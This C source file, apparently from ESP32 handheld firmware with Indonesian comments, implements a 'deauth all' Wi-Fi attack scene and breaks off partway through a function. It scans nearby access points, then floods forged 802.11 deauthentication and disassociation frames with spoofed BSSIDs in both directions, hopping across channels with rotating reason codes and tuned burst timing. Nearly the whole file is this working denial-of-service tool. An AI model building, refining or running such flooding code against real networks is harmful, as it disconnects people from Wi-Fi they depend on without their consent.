#include "../wlan_app.h"
#include <wlan_hal.h>
#include <wlan_passwords.h>
#include <esp_log.h>
#include <esp_err.h>
#include <esp_wifi.h>
#include <string.h>
#include <stdbool.h>
#include <stdlib.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/idf_additions.h>
#include <esp_heap_caps.h>
#include <esp_attr.h>
#include <toolbox/saved_struct.h>

#define MARAUDER_TAG "WlanMarauderEngine"

// ============================================================================
// KONFIGURASI SERANGAN — OPSI B FINAL
// ============================================================================
#define BURST_PER_AP                  6U
#define BURST_PER_AP_MULTI            4U
#define FRAME_REPEAT                  3U
#define FRAME_REPEAT_DELAY_MS         1U
#define WAVE_GAP_MS                   2U
#define POST_BURST_DWELL_MS           5U
#define CHANNEL_ACTIVE_DWELL_MS       0U
#define CHANNEL_EMPTY_DWELL_MS        2U
#define CHANNEL_SETTLE_MS             30U

#define TX_FAIL_RATE_THRESHOLD        20U
#define TX_QUEUE_DRAIN_MS             50U

// Interval rescan kini ditentukan user (Auto Scan 10..60 s). Hanya backoff saat
// scan gagal yang tetap konstan.
#define SCAN_FAILURE_BACKOFF_MS       20000U

#define DEAUTH_UI_REFRESH_MS          250U
#define WIFI_CHANNEL_MIN              1U
#define WIFI_CHANNEL_MAX              13U
#define MIN_RSSI_THRESHOLD            -90
#define EXIT_WAIT_MAX_MS              2000U
#define BLE_SETTLE_MS                 300U
#define WIFI_SETTLE_MS                200U
#define SCAN_RETRY_DELAY_MS           150U
// Jumlah sweep active-scan yang di-merge jadi satu snapshot. Active scan hanya
// dengar 80-120ms per channel; AP yang beacon-nya jatuh di luar window itu
// terlewat (p ~ miss-rate per pass). Dua pass yang di-union menurunkan miss ke
// ~p^2, jadi AP tidak lagi "kadang muncul kadang hilang" antar rescan.
#define SCAN_PASSES                   2U

// ============================================================================
// AUTO SCAN — konfigurasi tersimpan (durasi + on/off), persist antar buka-tutup
// ----------------------------------------------------------------------------
// OFF (default) → scan sekali di awal lalu flooding terus TANPA rescan periodik.
// ON            → rescan periodik tiap `interval_s` detik (10..60, pilihan user).
// Nilai di-mirror ke s_auto_scan_* (volatile) supaya task flooding membacanya
// live tanpa lock.
// ============================================================================
#define DEAUTH_ALL_CFG_PATH     "/ext/wifi/deauth_all.cfg"
#define DEAUTH_ALL_CFG_MAGIC    0x4D
#define DEAUTH_ALL_CFG_VERSION  1
#define DEAUTH_ALL_INTERVAL_MIN 10U
#define DEAUTH_ALL_INTERVAL_MAX 60U

typedef struct {
    uint8_t auto_scan_enabled; // 0/1
    uint8_t interval_s;        // 10..60 (kelipatan 10)
} DeauthAllCfg;

// ============================================================================
// STATE GLOBAL
// ============================================================================
static TaskHandle_t      s_marauder_task        = NULL;
static volatile bool     s_marauder_task_run    = false;
static volatile bool     s_marauder_task_done   = true;
static volatile bool     s_marauder_scanning    = false;
static volatile bool     s_marauder_cancel      = false;

static EXT_RAM_BSS_ATTR WlanApRecord s_marauder_ap_records[WLAN_APP_MAX_APS];
static volatile uint16_t s_marauder_ap_count    = 0;
static volatile bool     s_marauder_ap_sync_pending = false;
static bool              s_marauder_scene_active = false;
static volatile uint32_t s_marauder_frames_sent = 0;
static volatile uint8_t  s_marauder_current_channel = WIFI_CHANNEL_MIN;
static uint8_t           s_flipper_hardware_mac[6] = {0};
static volatile bool     s_force_rescan_on_start = false;
static volatile uint32_t s_tx_ok_count   = 0;
static volatile uint32_t s_tx_fail_count = 0;
static volatile uint32_t s_last_rescan_ms = 0;
static volatile uint32_t s_skip_rescan_until_ms = 0;
static uint16_t          s_seq_counter = 0;

// Mirror konfigurasi Auto Scan yang dibaca task flooding (lihat blok AUTO SCAN).
static volatile bool     s_auto_scan_enabled     = false;
static volatile uint32_t s_auto_scan_interval_ms = DEAUTH_ALL_INTERVAL_MIN * 1000U;

static const uint8_t marauder_reasons[] = {
    0x01, 0x04, 0x06, 0x07, 0x08, 0x0a, 0x0d, 0x0f, 0x12, 0x28
};
static const uint8_t global_broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

typedef enum {
    DEAUTH_START_OK = 0,
    DEAUTH_START_HAL_FAIL,
    DEAUTH_START_TASK_FAIL,
    DEAUTH_START_BUSY,
} DeauthStartResult;

extern int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3);

static inline bool wlan_lib_is_patched(void) {
    return ieee80211_raw_frame_sanity_check(0xC0, 0, 0) == 0;
}

static inline uint32_t now_ms(void) {
    return (uint32_t)(xTaskGetTickCount() * portTICK_PERIOD_MS);
}

static inline bool time_after(uint32_t now, uint32_t deadline) {
    return (int32_t)(now - deadline) >= 0;
}

// Normalisasi durasi ke kelipatan 10 dalam rentang [10..60].
static uint8_t deauth_all_clamp_interval(uint8_t s) {
    uint8_t v = (uint8_t)((s / 10U) * 10U); // snap ke kelipatan 10
    if(v < DEAUTH_ALL_INTERVAL_MIN) v = (uint8_t)DEAUTH_ALL_INTERVAL_MIN;
    if(v > DEAUTH_ALL_INTERVAL_MAX) v = (uint8_t)DEAUTH_ALL_INTERVAL_MAX;
    return v;
}

static void deauth_all_cfg_load(DeauthAllCfg* c) {
    memset(c, 0, sizeof(*c));
    bool ok = saved_struct_load(
        DEAUTH_ALL_CFG_PATH, c, sizeof(*c), DEAUTH_ALL_CFG_MAGIC, DEAUTH_ALL_CFG_VERSION);
    if(!ok) {
        c->auto_scan_enabled = 0; // default: Auto Scan MATI
        c->interval_s = (uint8_t)DEAUTH_ALL_INTERVAL_MIN; // default: 10 detik
    }
    c->auto_scan_enabled = c->auto_scan_enabled ? 1 : 0;
    c->interval_s = deauth_all_clamp_interval(c->interval_s);
}

static void deauth_all_cfg_save(const DeauthAllCfg* c) {
    saved_struct_save(
        DEAUTH_ALL_CFG_PATH, c, sizeof(*c), DEAUTH_ALL_CFG_MAGIC, DEAUTH_ALL_CFG_VERSION);
}

static void tx_queue_guard(void) {
    if(s_tx_ok_count < 20) return;
    uint32_t fail_pct = (s_tx_fail_count * 100) / s_tx_ok_count;
    if(fail_pct >= TX_FAIL_RATE_THRESHOLD) {
        ESP_LOGW(MARAUDER_TAG, "High fail rate (%lu%%), draining TX",
                 (unsigned long)fail_pct);
        vTaskDelay(pdMS_TO_TICKS(TX_QUEUE_DRAIN_MS));
        s_tx_ok_count = 0;
        s_tx_fail_count = 0;
    }
}

static inline void write_seq_ctrl(uint8_t* buf, uint16_t seq) {
    uint16_t s = seq & 0x0FFF;
    buf[22] = (uint8_t)((s & 0x0F) << 4);
    buf[23] = (uint8_t)((s >> 4) & 0xFF);
}

static void log_ap_list(const WlanApRecord* ap_records, uint16_t ap_count) {
    ESP_LOGI(MARAUDER_TAG, "=== AP LIST (%u total) ===", (unsigned)ap_count);
    for(uint16_t i = 0; i < ap_count && i < 15; i++) {
        ESP_LOGI(MARAUDER_TAG, "  [%u] %-20s ch=%-2u rssi=%d",
                 (unsigned)i,
                 ap_records[i].ssid[0] ? ap_records[i].ssid : "(hidden)",
                 ap_records[i].channel,
                 ap_records[i].rssi);
    }
    if(ap_count > 15) {
        ESP_LOGI(MARAUDER_TAG, "  ... and %u more", (unsigned)(ap_count - 15));
    }
}

// ============================================================================
// AUTO-SCAN
// ============================================================================
// Merge satu pass raw-scan ke set output (union by BSSID). AP yang sudah ada
// di-update hanya kalau pass ini melihatnya lebih kuat (RSSI lebih tinggi),
// supaya field channel/ssid mencerminkan sinyal terbaik. Mengembalikan jumlah
// entri setelah merge.
static uint16_t merge_scan_pass(
    WlanApRecord* out,
    uint16_t out_count,
    const wifi_ap_record_t* raw,
    uint16_t found,
    uint16_t* filtered_accum) {
    for(uint16_t i = 0; i < found && out_count < WLAN_APP_MAX_APS; ++i) {
        if(raw[i].rssi < MIN_RSSI_THRESHOLD) {
            if(filtered_accum) (*filtered_accum)++;
            continue;
        }

        int existing = -1;
        for(uint16_t j = 0; j < out_count; j++) {
            if(memcmp(out[j].bssid, raw[i].bssid, 6) == 0) {
                existing = j;
                break;
            }
        }

        WlanApRecord* r;
        if(existing >= 0) {
            // Sudah terlihat di pass sebelumnya — hanya timpa kalau sekarang
            // lebih kuat, kalau tidak biarkan snapshot terbaik bertahan.
            if(raw[i].rssi <= out[existing].rssi) continue;
            r = &out[existing];
        } else {
            r = &out[out_count++];
            memset(r, 0, sizeof(*r));
        }

        strncpy(r->ssid, (const char*)raw[i].ssid, sizeof(r->ssid) - 1);
        r->ssid[sizeof(r->ssid) - 1] = '\0';
        memcpy(r->bssid, raw[i].bssid, 6);
        r->rssi = raw[i].rssi;
        r->channel = raw[i].primary;
        r->authmode = raw[i].authmode;
        r->is_open = (raw[i].authmode == WIFI_AUTH_OPEN);
        r->has_password = !r->is_open && wlan_password_exists(r->ssid);
    }
    return out_count;
}

static bool wlan_app_auto_scan(WlanApRecord* ap_records, volatile uint16_t* ap_count) {
    if(ap_records == NULL || ap_count == NULL) return false;

    if(!wlan_hal_is_started()) {
        if(!wlan_hal_start()) {
            ESP_LOGE(MARAUDER_TAG, "auto_scan: start failed");
            return false;
        }
    }

    uint32_t t_start = now_ms();
    uint16_t merged = 0;
    uint16_t total_raw = 0;
    uint16_t filtered = 0;

    // Multi-pass: tiap pass adalah sweep active-scan penuh; hasilnya di-union.
    // Sebuah AP baru benar-benar hilang kalau terlewat di SEMUA pass, bukan di
    // satu snapshot saja — ini yang memperbaiki "wifi kadang tak terdeteksi".
    for(uint16_t pass = 0; pass < SCAN_PASSES; ++pass) {
        if(s_marauder_cancel) return false;

        wifi_ap_record_t* raw = NULL;
        uint16_t found = 0;
        wlan_hal_scan_cancellable(&raw, &found, WLAN_APP_MAX_APS, &s_marauder_cancel);

        if(s_marauder_cancel) {
            if(raw) free(raw);
            return false;
        }

        if(raw && found > 0) {
            total_raw += found;
            merged = merge_scan_pass(ap_records, merged, raw, found, &filtered);
        }
        if(raw) free(raw);

        // Jeda kecil antar-pass supaya fase beacon/dwell bergeser — pass kedua
        // menangkap AP yang "nyaris" terlewat di pass pertama.
        if((uint16_t)(pass + 1) < SCAN_PASSES && merged < WLAN_APP_MAX_APS) {
            vTaskDelay(pdMS_TO_TICKS(SCAN_RETRY_DELAY_MS));
        }
    }

    uint32_t t_scan = now_ms() - t_start;

    if(merged > 0) {
        *ap_count = merged;
        ESP_LOGI(MARAUDER_TAG,
                 "auto_scan: %u APs (raw=%u filtered=%u passes=%u scan=%lums)",
                 (unsigned)merged, (unsigned)total_raw, (unsigned)filtered,
                 (unsigned)SCAN_PASSES, (unsigned long)t_scan);
        return true;
    }
    return false;
}

// ============================================================================
// HELPER
// ============================================================================
static uint16_t count_aps_on_channel(const WlanApRecord* ap_records, uint16_t ap_count, uint8_t ch) {
    if(ap_records == NULL) return 0;
    uint16_t n = 0;
    for(uint16_t i = 0; i < ap_count; i++) if(ap_records[i].channel == ch) n++;
    return n;
}

static uint16_t build_channel_mask(const WlanApRecord* rec, uint16_t count) {
    uint16_t mask = 0;
    for(uint16_t i = 0; i < count; i++) {
        uint8_t ch = rec[i].channel;
        if(ch >= WIFI_CHANNEL_MIN && ch <= WIFI_CHANNEL_MAX) mask |= (uint16_t)(1u << ch);
    }
    return mask;
}

static void deauth_copy_ap_records_from_app(WlanApp* app) {
    if(!app) { s_marauder_ap_count = 0; return; }
    uint16_t ap_count = app->ap_count;
    if(ap_count > WLAN_APP_MAX_APS) ap_count = WLAN_APP_MAX_APS;
    if(app->ap_records && ap_count > 0) {
        memcpy(s_marauder_ap_records, app->ap_records,
               ap_count * sizeof(s_marauder_ap_records[0]));
    }
    s_marauder_ap_count = app->ap_records ? ap_count : 0;
}

static void deauth_copy_ap_records_to_app(WlanApp* app) {
    if(!app || !app->ap_records) return;
    uint16_t ap_count = s_marauder_ap_count;
    if(ap_count > WLAN_APP_MAX_APS) ap_count = WLAN_APP_MAX_APS;
    if(ap_count > 0) {
        memcpy(app->ap_records, s_marauder_ap_records,
               ap_count * sizeof(s_marauder_ap_records[0]));
    }
    app->ap_count = ap_count;
}

static inline bool wlan_execute_raw_tx(const uint8_t* buf, uint16_t len) {
    bool ok = wlan_hal_raw_tx_retry(buf, len);
    if(ok) s_tx_ok_count++; else s_tx_fail_count++;

    uint32_t total = s_tx_ok_count + s_tx_fail_count;
    if(total > 0 && (total % 500) == 0) {
        ESP_LOGI(MARAUDER_TAG, "TX -> OK: %lu | FAIL: %lu",
                 (unsigned long)s_tx_ok_count, (unsigned long)s_tx_fail_count);
    }
    return ok;
}

static inline void send_frame_repeat(const uint8_t* frame, uint16_t len) {
    for(uint32_t r = 0; r < FRAME_REPEAT; r++) {
        if(wlan_execute_raw_tx(frame, len)) s_marauder_frames_sent++;
        vTaskDelay(pdMS_TO_TICKS(FRAME_REPEAT_DELAY_MS));
    }
}

// ============================================================================
// BROADCAST DEAUTH
// ============================================================================
static void send_broadcast_deauth(const uint8_t* bssid, uint8_t reason) {
    uint8_t bcast[26];
    bcast[0] = 0xC0; bcast[1] = 0x00;
    bcast[2] = 0x3A; bcast[3] = 0x01;
    memcpy(&bcast[4],  global_broadcast_mac, 6);
    memcpy(&bcast[10], bssid, 6);
    memcpy(&bcast[16], bssid, 6);
    write_seq_ctrl(bcast, s_seq_counter++);
    bcast[24] = reason; bcast[25] = 0x00;
    send_frame_repeat(bcast, sizeof(bcast));
}

// ============================================================================
// SEND DEAUTH BURST
// ============================================================================
static void send_deauth_burst_for_ap(const uint8_t* bssid, uint8_t reason) {
    uint8_t buf[26];

    // Arah 1: AP → Client
    buf[0] = 0xC0; buf[1] = 0x00;
    buf[2] = 0x3A; buf[3] = 0x01;
    memcpy(&buf[4],  global_broadcast_mac, 6);
    memcpy(&buf[10], bssid, 6);
    memcpy(&buf[16], bssid, 6);
    write_seq_ctrl(buf, s_seq_counter++);
    buf[24] = reason; buf[25] = 0x00;
    send_frame_repeat(buf, sizeof(buf));

    buf[0] = 0xA0;
    write_seq_ctrl(buf, s_seq_counter++);
    send_frame_repeat(buf, sizeof(buf));

    // Broadcast (rate 20%)
    send_broadcast_deauth(bssid, reason);

    // Arah 2: Client → AP
    uint8_t rev[26];
    rev[0] = 0xC0; rev[1] = 0x00;
    rev[2] = 0x3A; rev[3] = 0x01;
    memcpy(&rev[4],  bssid, 6);
    memcpy(&rev[10], s_flipper_hardware_mac, 6);
    memcpy(&rev[16], bssid, 6);
    write_seq_ctrl(rev, s_seq_counter++);
    rev[24] = reason; rev[25] = 0x00;
    send_frame_repeat(rev, sizeof(rev));

    rev[0] = 0xA0;
    write_seq_ctrl(rev, s_seq_counter++);
    send_frame_repeat(rev, sizeof(rev));
}

// ============================================================================
// TASK UTAMA
// ============================================================================
static void wlan_marauder_hopping_task_fn(void* arg) {
    UNUSED(arg);

    ESP_LOGI(MARAUDER_TAG, "Task started (Opsi B - 30ms settle)");

    s_marauder_scanning = true;

    if(!wlan_hal_is_started()) {
        ESP_LOGI(MARAUDER_TAG, "BLE settle %ums...", (unsigned)BLE_SETTLE_MS);
        vTaskDelay(pdMS_TO_TICKS(BLE_SETTLE_MS));
        // Sengaja TIDAK self-delete di sini meski sudah di-cancel: pada titik ini
        // BT-Stack masih resident (wlan_hal_start belum jalan), dan vTaskDelete-
        // WithCaps men-spawn task helper (configMINIMAL_STACK_SIZE=2KB) dari
        // INTERNAL RAM — justru pool yang langka saat BT resident, dan gagalnya
        // alokasi itu memicu abort() di dalam IDF. Jalan terus ke wlan_hal_start
        // dulu (men-stop BT → internal RAM lega); cancel dihormati di cek setelah
        // WiFi up (BT sudah turun → self-delete aman).

        ESP_LOGI(MARAUDER_TAG, "Starting WiFi HAL...");
        if(!wlan_hal_start()) {
            ESP_LOGE(MARAUDER_TAG, "wlan_hal_start failed");
            s_marauder_scanning = false; s_marauder_task_run = false; s_marauder_task_done = true;
            vTaskDeleteWithCaps(NULL);
        }

        ESP_LOGI(MARAUDER_TAG, "WiFi settle %ums...", (unsigned)WIFI_SETTLE_MS);
        vTaskDelay(pdMS_TO_TICKS(WIFI_SETTLE_MS));
        if(!s_marauder_task_run) { s_marauder_scanning = false; s_marauder_task_done = true; vTaskDeleteWithCaps(NULL); }
    }

    if(wlan_hal_is_connected()) wlan_hal_disconnect();

    bool mac_ok = wlan_hal_get_own_mac(s_flipper_hardware_mac);
    bool mac_zero = true;
    for(int i = 0; i < 6; i++) if(s_flipper_hardware_mac[i] != 0) { mac_zero = false; break; }
    if(!mac_ok || mac_zero) {
        s_flipper_hardware_mac[0] = 0x02; s_flipper_hardware_mac[1] = 0x00;
        s_flipper_hardware_mac[2] = 0x00; s_flipper_hardware_mac[3] = 0x00;
        s_flipper_hardware_mac[4] = 0x00; s_flipper_hardware_mac[5] = 0x01;
    } else {
        ESP_LOGI(MARAUDER_TAG, "MAC: %02X:%02X:%02X:%02X:%02X:%02X",
                 s_flipper_hardware_mac[0], s_flipper_hardware_mac[1],
                 s_flipper_hardware_mac[2], s_flipper_hardware_mac[3],
                 s_flipper_hardware_mac[4], s_flipper_hardware_mac[5]);
    }

    wlan_hal_set_promiscuous(false, NULL);

    if(s_marauder_ap_count == 0 || s_force_rescan_on_start) {
        if(s_force_rescan_on_start) {
            ESP_LOGI(MARAUDER_TAG, "Phase 1: FORCE rescan (fresh session)");
            s_marauder_ap_count = 0;
            s_force_rescan_on_start = false;
        } else {
            ESP_LOGI(MARAUDER_TAG, "Phase 1: scanning (empty list)...");
        }

        wlan_app_auto_scan(s_marauder_ap_records, &s_marauder_ap_count);
        if(s_marauder_task_run) {
            log_ap_list(s_marauder_ap_records, s_marauder_ap_count);
            wlan_hal_set_promiscuous(false, NULL);
            vTaskDelay(5);
        }
    } else {
        ESP_LOGI(MARAUDER_TAG, "Phase 1: skipped (%u APs cached)", (unsigned)s_marauder_ap_count);
    }
    s_marauder_scanning = false;

    if(!s_marauder_task_run) {
        s_marauder_task_done = true;
        vTaskDelay(pdMS_TO_TICKS(10));
        vTaskDeleteWithCaps(NULL);
    }

    s_last_rescan_ms = now_ms();
    s_skip_rescan_until_ms = 0;
    s_seq_counter = 0x0000;

    uint16_t channel_mask = build_channel_mask(s_marauder_ap_records, s_marauder_ap_count);

    ESP_LOGI(MARAUDER_TAG, "Phase 2: attack. AP=%u mask=0x%04X settle=%ums burst=%u",
             (unsigned)s_marauder_ap_count,
             (unsigned)channel_mask,
             (unsigned)CHANNEL_SETTLE_MS,
             (unsigned)BURST_PER_AP);

    uint32_t cycle_counter = 0;
    s_marauder_current_channel = WIFI_CHANNEL_MIN;

    while(s_marauder_task_run) {
        // Auto Scan: interval tetap sesuai pilihan user. Saat OFF, blok rescan di
        // bawah TIDAK PERNAH dieksekusi (gating s_auto_scan_enabled) — flooding
        // jalan terus dengan AP list dari scan awal. Aman: channel_mask & mode
        // promiscuous sudah di-set di Phase 1, TX health diurus tx_queue_guard().
        uint32_t interval = s_auto_scan_interval_ms;
        uint32_t now = now_ms();

        bool past_backoff = (s_skip_rescan_until_ms == 0) || time_after(now, s_skip_rescan_until_ms);
        bool interval_elapsed = (uint32_t)(now - s_last_rescan_ms) >= interval;

        if(s_auto_scan_enabled && cycle_counter > 0 && interval_elapsed && past_backoff) {
            if(!s_marauder_task_run) break;
            s_marauder_scanning = true;
            ESP_LOGI(MARAUDER_TAG, "Rescan @ cycle %lu (AP=%u, interval=%lums)",
                     (unsigned long)cycle_counter, (unsigned)s_marauder_ap_count,
                     (unsigned long)interval);
            bool ok = wlan_app_auto_scan(s_marauder_ap_records, &s_marauder_ap_count);
            s_marauder_scanning = false;
            s_last_rescan_ms = now_ms();
            if(!s_marauder_task_run) break;
            if(ok) {
                channel_mask = build_channel_mask(s_marauder_ap_records, s_marauder_ap_count);
                ESP_LOGI(MARAUDER_TAG, "Rescan OK. AP=%u mask=0x%04X",
                         (unsigned)s_marauder_ap_count, (unsigned)channel_mask);
            } else {
                s_skip_rescan_until_ms = now_ms() + SCAN_FAILURE_BACKOFF_MS;
                ESP_LOGW(MARAUDER_TAG, "Rescan gagal, backoff 20s");
            }
            wlan_hal_set_promiscuous(false, NULL);
        }

        wlan_hal_set_channel(s_marauder_current_channel);
        vTaskDelay(pdMS_TO_TICKS(CHANNEL_SETTLE_MS));

        uint16_t aps_here = count_aps_on_channel(
            s_marauder_ap_records, s_marauder_ap_count, s_marauder_current_channel);

        if(aps_here > 0) {
            tx_queue_guard();
            uint32_t burst_per_ap = (aps_here >= 2) ? BURST_PER_AP_MULTI : BURST_PER_AP;

            for(uint16_t i = 0; i < s_marauder_ap_count; i++) {
                if(!s_marauder_task_run) break;
                if(s_marauder_ap_records[i].channel != s_marauder_current_channel) continue;

                for(uint32_t wave = 0; wave < burst_per_ap; wave++) {
                    if(!s_marauder_task_run) break;

                    uint8_t wave_reason = marauder_reasons[
                        (cycle_counter * burst_per_ap + wave) % sizeof(marauder_reasons)];

                    send_deauth_burst_for_ap(s_marauder_ap_records[i].bssid, wave_reason);

                    if(wave < burst_per_ap - 1) {
                        vTaskDelay(pdMS_TO_TICKS(WAVE_GAP_MS));
                    }
                }

                vTaskDelay(pdMS_TO_TICKS(POST_BURST_DWELL_MS));
            }

            vTaskDelay(pdMS_TO_TICKS(CHANNEL_ACTIVE_DWELL_MS));
        } else {
            vTaskDelay(pdMS_TO_TICKS(CHANNEL_EMPTY_DWELL_MS));
        }

        cycle_counter++;

        if((cycle_counter % 30) == 0) {
            ESP_LOGI(MARAUDER_TAG, "cycle=%lu ch=%u aps=%u frames=%lu",
                     (unsigned long)cycle_counter,
                     (unsigned)s_marauder_current_channel,
                     (unsigned)aps_here,
                     (unsigned long)s_marauder_frames_sent);
        }

        if(channel_mask != 0) {
            uint8_t start_ch = s_marauder_current_channel;
            do {
                s_marauder_current_channel++;
                if(s_marauder_current_channel > WIFI_CHANNEL_MAX) s_marauder_current_channel = WIFI_CHANNEL_MIN;
                if(s_marauder_current_channel == start_ch) break;
            } while(((channel_mask >> s_marauder_current_channel) & 1u) == 0);
        } else {
            s_marauder_current_channel++;
            if(s_marauder_current_channel > WIFI_CHANNEL_MAX) s_marauder_current_channel = WIFI_CHANNEL_MIN;
        }
    }

    ESP_LOGI(MARAUDER_TAG, "Task exit (frames=%lu, cycles=%lu)",
             (unsigned long)s_marauder_frames_sent, (unsigned long)cycle_counter);

    s_marauder_scanning = false;
    s_marauder_task_run = false;
    s_marauder_task_done = true;
    vTaskDelay(pdMS_TO_TICKS(10));
    vTaskDeleteWithCaps(NULL);
}

// ============================================================================
// START / STOP
// ============================================================================
static DeauthStartResult deauth_marauder_worker_start(WlanApp* app) {
    if(s_marauder_task_run && !s_marauder_task_done) return DEAUTH_START_OK;
    if(!s_marauder_task_done) return DEAUTH_START_BUSY;

    deauth_copy_ap_records_from_app(app);
    s_marauder_ap_sync_pending = true;

    s_marauder_frames_sent = 0;
    s_marauder_current_channel = WIFI_CHANNEL_MIN;
    s_tx_ok_count = 0;
    s_tx_fail_count = 0;
    s_marauder_scanning = false;
    s_marauder_task_run = true;
    s_marauder_task_done = false;
    s_marauder_cancel = false;
    s_seq_counter = 0x0000;

    s_last_rescan_ms = now_ms();
    s_skip_rescan_until_ms = 0;

    // Worker-Stack ins PSRAM (xTaskCreatePinnedToCoreWithCaps): der (geparkte)
    // BT-Stack kann beim Start noch resident sein → ein 8-KB-Task-Stack aus
    // internem RAM scheiterte mit ENOMEM. Nur der kleine TCB bleibt intern.
    // esp_wifi_* läuft nicht auf diesem Stack (raw-TX wird an den WlanHal-Worker
    // dispatcht), daher ist ein PSRAM-Stack hier sicher. Self-Delete MUSS über
    // vTaskDeleteWithCaps laufen.
    BaseType_t rc = xTaskCreatePinnedToCoreWithCaps(
        wlan_marauder_hopping_task_fn, "WlanMrdFlood",
        8192, NULL, 5, &s_marauder_task, FURI_CORE_ID_SECONDARY, MALLOC_CAP_SPIRAM);

    if(rc != pdPASS) {
        s_marauder_task_run = false;
        s_marauder_task_done = true;
        s_marauder_task = NULL;
        s_marauder_ap_sync_pending = false;
        return DEAUTH_START_TASK_FAIL;
    }
    return DEAUTH_START_OK;
}

static void deauth_marauder_worker_stop(WlanApp* app) {
    if(s_marauder_task_done) {
        s_marauder_task = NULL;
        if(app && s_marauder_ap_sync_pending) deauth_copy_ap_records_to_app(app);
        s_marauder_ap_sync_pending = false;
        return;
    }
    s_marauder_cancel = true;
    s_marauder_task_run = false;
    if(!s_marauder_scene_active) s_marauder_ap_sync_pending = false;
    ESP_LOGI(MARAUDER_TAG, "Stop requested");
}

// ============================================================================
// UI HELPERS (fokus 3 kontrol: Start / Auto Scan / Durasi)
// ============================================================================

// Mulai/stop flooding. Start SELALU memaksa scan awal (force_rescan) lalu
// flooding — tidak berubah dari perilaku lama.
static void deauth_all_toggle_run(WlanApp* app) {
    WlanDeauthAllModel* model = view_get_model(app->view_deauth_all);
    bool target_state = !model->running;
    view_commit_model(app->view_deauth_all, false);

    if(target_state) {
        s_force_rescan_on_start = true;
        DeauthStartResult res = deauth_marauder_worker_start(app);
        if(res == DEAUTH_START_OK) {
            with_view_model(
                app->view_deauth_all, WlanDeauthAllModel * m, { m->running = true; }, true);
        } else if(res == DEAUTH_START_BUSY) {
            ESP_LOGW(MARAUDER_TAG, "Busy");
            s_force_rescan_on_start = false;
        } else {
            const char* msg = (res == DEAUTH_START_HAL_FAIL)  ? "WIFI FAIL" :
                              (res == DEAUTH_START_TASK_FAIL) ? "TASK FAIL" :
                                                                "ERROR";
            with_view_model(
                app->view_deauth_all, WlanDeauthAllModel * m,
                {
                    strncpy(m->target_ssid, msg, sizeof(m->target_ssid) - 1);
                    m->target_ssid[sizeof(m->target_ssid) - 1] = '\0';
                },
                true);
            s_force_rescan_on_start = false;
        }
    } else {
        with_view_model(
            app->view_deauth_all, WlanDeauthAllModel * m, { m->running = false; }, true);
        deauth_marauder_worker_stop(app);
    }
}

// Simpan setting ke flash + update mirror global (dibaca task flooding live).
static void deauth_all_apply_settings(WlanApp* app) {
    DeauthAllCfg c = {.auto_scan_enabled = 0, .interval_s = (uint8_t)DEAUTH_ALL_INTERVAL_MIN};
    with_view_model(
        app->view_deauth_all, WlanDeauthAllModel * m,
        {
            c.auto_scan_enabled = m->auto_scan_enabled ? 1 : 0;
            c.interval_s = m->interval_s;
        },
        false);
    s_auto_scan_enabled = c.auto_scan_enabled ? true : false;
    s_auto_scan_interval_ms = (uint32_t)c.interval_s * 1000U;
    deauth_all_cfg_save(&c);
}

// OK/Select: bertindak sesuai kontrol yang sedang fokus (atau konfirmasi edit).
static void deauth_all_handle_ok(WlanApp* app) {
    uint8_t focus = DeauthAllFocusStart;
    bool editing = false;
    with_view_model(
        app->view_deauth_all, WlanDeauthAllModel * m,
        {
            focus = m->focus;
            editing = m->editing_duration;
        },
        false);

    if(editing) {
        // Konfirmasi pilihan durasi → keluar edit, simpan.
        with_view_model(
            app->view_deauth_all, WlanDeauthAllModel * m, { m->editing_duration = false; }, true);
        deauth_all_apply_settings(app);
        return;
    }

    switch(focus) {
    case DeauthAllFocusStart:
        deauth_all_toggle_run(app);
        break;
    case DeauthAllFocusAuto:
        with_view_model(
            app->view_deauth_all, WlanDeauthAllModel * m,
            { m->auto_scan_enabled = !m->auto_scan_enabled; }, true);
        deauth_all_apply_settings(app);
        break;
    case DeauthAllFocusDuration:
        // Masuk mode edit; simpan nilai lama untuk dibatalkan via Back.
        with_view_model(
            app->view_deauth_all, WlanDeauthAllModel * m,
            {
                m->editing_duration = true;
                m->interval_s_backup = m->interval_s;
            },
            true);
        break;
    default:
        break;
    }
}

// Nav (+1 = Up/Right, -1 = Down/Left): saat edit ubah durasi, selain itu pindah
// fokus antar kontrol.
static void deauth_all_handle_nav(WlanApp* app, int dir) {
    bool editing = false;
    with_view_model(
        app->view_deauth_all, WlanDeauthAllModel * m, { editing = m->editing_duration; }, false);

    if(editing) {
        with_view_model(
            app->view_deauth_all, WlanDeauthAllModel * m,
            {
                int v = (int)m->interval_s + dir * 10;
                if(v < (int)DEAUTH_ALL_INTERVAL_MIN) v = (int)DEAUTH_ALL_INTERVAL_MIN;
                if(v > (int)DEAUTH_ALL_INTERVAL_MAX) v = (int)DEAUTH_ALL_INTERVAL_MAX;
                m->interval_s = (uint8_t)v;
            },
            true);
    } else {
        with_view_model(
            app->view_deauth_all, WlanDeauthAllModel * m,
            {
                int f = (int)m->focus + dir;
                if(f < 0) f = 0;
                if(f >= (int)DeauthAllFocusCount) f = (int)DeauthAllFocusCount - 1;
                m->focus = (uint8_t)f;
            },
            true);
    }
}

void wlan_app_scene_deauth_all_on_enter(void* context) {
    WlanApp* app = context;
    s_marauder_scene_active = true;

    if(s_marauder_task_done) {
        s_marauder_task = NULL;
        if(s_marauder_ap_sync_pending) {
            deauth_copy_ap_records_to_app(app);
            s_marauder_ap_sync_pending = false;
        }
        deauth_copy_ap_records_from_app(app);
    }

    s_marauder_frames_sent = 0;
    s_marauder_current_channel = WIFI_CHANNEL_MIN;
    s_tx_ok_count = 0;
    s_tx_fail_count = 0;

    // Muat setting Auto Scan tersimpan (durasi mengikuti pilihan terakhir user,
    // default: MATI + 10s) lalu mirror ke global yang dibaca task.
    DeauthAllCfg cfg;
    deauth_all_cfg_load(&cfg);
    s_auto_scan_enabled = cfg.auto_scan_enabled ? true : false;
    s_auto_scan_interval_ms = (uint32_t)cfg.interval_s * 1000U;

    with_view_model(
        app->view_deauth_all,
        WlanDeauthAllModel * model,
        {
            model->running = false;
            model->frames = 0;
            model->current_channel = WIFI_CHANNEL_MIN;
            model->elapsed_ms = 0;

            model->focus = DeauthAllFocusStart; // default fokus = Start
            model->editing_duration = false;
            model->auto_scan_enabled = cfg.auto_scan_enabled ? true : false;
            model->interval_s = cfg.interval_s;
            model->interval_s_backup = cfg.interval_s;

            if(!wlan_lib_is_patched()) {
